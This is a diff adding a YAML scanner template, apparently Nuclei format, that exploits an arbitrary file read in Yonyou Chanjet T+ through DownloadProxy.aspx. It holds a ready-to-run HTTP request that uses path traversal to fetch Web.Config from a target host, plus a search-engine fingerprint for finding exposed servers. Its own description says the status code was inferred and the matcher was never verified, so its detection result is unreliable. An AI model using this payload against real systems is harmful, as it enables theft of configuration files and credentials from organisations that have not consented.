@@ -1,0 +1,31 @@
+id: poc-d8f949dbc74d2f747231
+info:
+  name: 用友畅捷通TPlusDownloadProxy.aspx任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d8f949dbc74d2f747231a2d7ba8397ca
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: d8f949dbc74d2f747231a2d7ba8397ca
+    fofa: + hunter`app.name="畅捷通 T+"`
+http:
+- raw:
+  - 'GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1
+
+    X-Ajaxpro-Method: GetStoreWarehouseByStore
+
+    User-Agent: Java/1.8.0_381
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
